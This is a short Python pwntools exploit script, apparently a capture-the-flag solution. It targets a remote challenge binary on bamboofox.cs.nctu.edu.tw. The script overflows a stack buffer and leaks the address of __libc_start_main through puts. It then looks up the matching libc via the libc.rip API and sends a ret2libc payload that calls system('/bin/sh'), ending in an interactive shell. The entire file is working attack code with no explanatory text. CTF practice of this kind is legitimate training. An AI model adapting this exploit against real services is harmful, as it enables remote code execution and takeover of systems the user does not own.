from pwn import *
import requests as req

#sh = process('./pwn')
sh = remote('bamboofox.cs.nctu.edu.tw', 11002)
e = ELF('./pwn')

padding = b'a'*(0x1c+4)

sh.recvuntil(b'is ')
_bin_sh_addr = int(sh.recvuntil(b'\n'), 16)

sh.recvuntil(b'is ')
_puts_addr = int(sh.recvuntil(b'\n'), 16)

__libc_start_main_got = e.got['__libc_start_main']
_start_addr = e.symbols['_start']

sh.sendline(padding + p32(_puts_addr) + p32(_start_addr) + p32(__libc_start_main_got))

s = sh.recv()
print(s)

__libc_start_main_addr = u32(s[0:4])



data = {'symbols': {
    '__libc_start_main': str(hex(__libc_start_main_addr)),
    'puts': str(hex(_puts_addr))
    }}

r = req.post('https://libc.rip/api/find', json=data)
libcdatabase = r.json()[0]['symbols']
libcdatabase = {x:int(y, 16) for x,y in libcdatabase.items()}

libcbase = _puts_addr - libcdatabase['puts']
_system_addr = libcbase + libcdatabase['system']

payload = padding + p32(_system_addr) + p32(0xdeadbeef) + p32(_bin_sh_addr)

print(payload)

sh.sendline(payload)
sh.interactive()
